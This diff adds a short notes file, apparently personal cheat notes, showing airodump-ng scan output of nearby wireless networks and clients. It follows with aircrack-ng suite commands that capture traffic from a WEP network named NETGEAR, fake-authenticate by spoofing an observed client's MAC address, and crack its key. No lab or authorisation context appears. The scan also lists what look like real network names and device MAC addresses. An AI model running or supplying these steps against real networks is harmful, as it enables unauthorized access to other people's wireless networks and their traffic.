@@ -1,0 +1,32 @@
+ sudo airodump-ng eth1
+
+ BSSID              PWR  Beacons    #Data, #/s  CH  MB  ENC  CIPHER AUTH ESSID
+                                                                                              
+ 00:09:5B:C9:26:7C  218      436       22    0  11  54. OPN              cat z               
+ 00:1E:2A:73:31:0C  194      224        0    0   1  48  WPA2 CCMP   PSK  lambda1010          
+ 00:E0:98:E1:48:90  186       89        4    0   6  54. OPN              05B401892831        
+ 00:40:10:20:00:03  179      161        7    0  11  48. WEP  WEP         Joovay              
+ 00:09:5B:99:C4:F4  180      217       71    0   6  54. WEP  WEP         NETGEAR             
+ 00:12:0E:63:E4:CD  176       47        0    0   6  54  WEP  WEP         07B404425511        
+ 00:1B:2F:D4:3E:50  174       20        0    0   1  54. WEP  WEP         michel              
+ 00:12:0E:56:EA:83  173        2       35    0  10  54  WEP  WEP         06B412329855        
+ 00:18:39:D7:DF:39  173        3        0    0   6  48  WPA  TKIP   PSK  linksys              
+                                                                                              
+ BSSID              STATION            PWR   Rate  Lost  Packets  Probes                      
+                                                                                              
+ 00:E0:98:E1:48:90  00:1A:73:E3:B2:8B   -1   1- 0     0        2                              
+ 00:09:5B:99:C4:F4  00:1F:E1:48:13:43   -1   1- 0     0       82                              
+ 00:1B:2F:D4:3E:50  00:13:02:A5:4A:B5  173   0- 1     0       10                              
+ 00:12:0E:56:EA:83  00:19:7E:CC:89:16  180   0- 1   180       96  06B412329855                
+ (not associated)   00:1A:73:2A:02:8A  182   0- 1     0        5                              
+ (not associated)   00:1F:E1:C3:F9:B1  173   0- 1     0        2  wireless      
+
+*sudo airodump-ng -c 6 --bssid 00:09:5B:99:C4:F4 -w output eth1
+
+*sudo aireplay-ng -1 0 -e NETGEAR -a 00:09:5B:99:C4:F4 -h 00:1F:E1:48:13:43 eth1
+or
+sudo aireplay-ng -1 6000 -o 1 -q 10  -e NETGEAR -a 00:09:5B:99:C4:F4 -h 00:1F:E1:48:13:43 eth1
+
+*sudo aircrack-ng -z -b 00:09:5B:99:C4:F4 output*.cap
+or
+sudo aircrack-ng -b 00:09:5B:99:C4:F4 output*.cap
